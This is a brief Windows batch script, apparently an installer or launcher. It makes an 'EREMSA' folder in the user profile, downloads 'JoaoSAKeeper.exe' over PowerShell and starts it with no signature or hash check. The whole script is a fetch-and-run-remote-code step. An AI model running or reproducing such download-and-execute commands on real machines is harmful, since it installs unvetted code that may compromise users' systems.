@echo off
setlocal
set "TARGET=%USERPROFILE%\EREMSA"
if not exist "%TARGET%" mkdir "%TARGET%"
set "DOWNLOAD_URL=https://content.cubie.com.br/public/eremsa/JoaoSAKeeper.exe"
set "OUT=%TARGET%\JoaoSAKeeper.exe"
powershell -NoProfile -Command "Try { (New-Object System.Net.WebClient).DownloadFile('%DOWNLOAD_URL%','%OUT%') } Catch { Exit 1 }"
if exist "%OUT%" (
  start "" "%OUT%"
) 
endlocal
